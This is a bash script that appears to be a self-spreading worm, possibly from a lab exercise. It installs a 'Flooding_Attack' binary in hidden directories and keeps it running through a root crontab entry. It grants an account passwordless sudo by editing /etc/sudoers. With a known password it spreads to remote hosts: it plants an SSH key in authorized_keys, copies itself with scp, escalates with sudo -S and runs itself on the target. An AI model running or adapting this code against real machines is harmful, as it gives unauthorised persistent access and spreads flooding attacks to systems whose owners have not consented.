#!/bin/bash

file1="/home/victim/.etc/Flooding_Attack"
file2="/home/victim/.bin/Flooding_Attack"

if [ $UID -ne 0 ] && [ $# -ne 3 ]; then
	echo "Should be run as root"
elif [ $# -eq 0 ]; then
	printf "Create two hidden directories ... "
	mkdir ~/.etc ~/.bin
	printf "\nCopy files ... "
	cp Flooding_Attack ~/.etc/
	cp Flooding_Attack ~/.bin/
	printf "\nModify crontab ... "
	grep "pgrep" /etc/crontab > /dev/null || (echo "*/1 * * * * root pgrep Flooding_Attack || ([ -f $file1 ] && ($file1 &)) || ([ -f $file2 ] && ($file2 &))" >> /etc/crontab)
	printf "\nExecute worm ...\n"
	chmod +x Flooding_Attack
	./Flooding_Attack &
elif [ $# -eq 1 ] && [ "$1" = "help" ]; then
	echo "Usage : "
	echo -e "\t local  : sudo ./worm.sh"
	echo -e "\t remote : ./worm.sh [IP] [ACCOUNT] [PASSWD]"
	echo -e "\t crack  : ./worm.sh transmit [IP] [ACCOUNT]"
	echo -e "\t clean  : sudo ./worm.sh clean"
elif [ $# -eq 1 ] && [ "$1" = "clean" ]; then
	printf "Remove two hidden directories ... "
	rm -rf ~/.etc ~/.bin
	printf "\nKill the processes of attack ...\n"
	pgrep Flooding_Attack | awk '{print $1}' | xargs kill
elif [ $# -eq 2 ] && [ "$1" = "root" ]; then
	echo $2' ALL=NOPASSWD: ALL' >> /etc/sudoers
elif [ $# -eq 3 ] && [ "$1" = "transmit" ]; then
	printf "Transmit the files to the target ... "
	scp $PWD/* $3@$2:.
	printf "\nRun the worm on the target ...\n"
	(ssh $3@$2 'sudo ./worm.sh' &) > /dev/null 2> /dev/null 
elif [ $# -eq 3 ]; then
	printf "Generate ssh key ... "
	echo "" | ssh-keygen > /dev/null
	printf "\nTransmit the public key to the target ... "
	export SSHPASS=$3
	sshpass -e ssh -o StrictHostKeyChecking=no $2@$1 'mkdir .ssh'
	sshpass -e ssh $2@$1 'chmod 700 .ssh'
	sshpass -e ssh $2@$1 'echo "" > .ssh/authorized_keys'
	sshpass -e scp ~/.ssh/id_rsa.pub $2@$1:~/.ssh/
	sshpass -e ssh $2@$1 'cat .ssh/id_rsa.pub >> .ssh/authorized_keys'
	printf "\nTransmit the files to the target ... "
	scp $PWD/* $2@$1:.
	printf "\nGet the privilege ... "
	ssh $2@$1 'echo '$3' | sudo -S ./worm.sh root '$2
	printf "\nRun the worm on the target ... \n"
	(ssh $2@$1 'sudo ./worm.sh' &) > /dev/null 2> /dev/null 
else
	echo -e "Error usage !"
	echo "Try \"sudo ./worm.sh help\" for help."
fi